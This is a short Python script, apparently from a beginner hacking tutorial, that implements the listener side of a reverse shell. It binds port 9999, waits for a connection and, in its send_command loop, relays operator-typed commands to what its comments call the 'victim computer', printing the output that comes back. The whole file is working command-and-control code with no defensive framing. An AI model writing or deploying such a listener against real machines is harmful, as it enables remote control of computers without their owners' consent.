import sys
import socket

# Create a server
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket create error'+str(msg))

# binding socket and listening for connection
def bind_socket():
    try:
        global host
        global port
        global s
        print('The port number is: '+str(port))

        # bind host(or IP) and port
        s.bind(('',port))

        # listening the connection that want to connect with the server
        s.listen(5)
    except socket.error as msg:
        print('Socket create error'+str(msg))
        # recursion
        bind_socket()

# Establish connection (accept)
def socket_accept():
    conn, address = s.accept()
    print('Connection Established IP: {} port: {}'.format(address[0], port))
    # for send commands
    send_command(conn)
    conn.close()

# send command to victim computer
def send_command(conn):
    # to send continuous command to victim computer
    while True:
        cmd = input()
        if cmd == 'stop':
            conn.close()
            s.close()
            sys.exit()
        # check the user type anything or not
        # we know the if we send some msg one computer to another computer
        # then its sends and receive inform of byte so we have to convert it into string
        if len(str.encode(cmd)) > 0:
            # to send the command
            conn.send(str.encode(cmd))
            # to received the message from victim computer
            response = str(conn.recv(1024),'utf-8')  # 1024 is the amount of packets or chunks of datas
            print(response, end='')


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
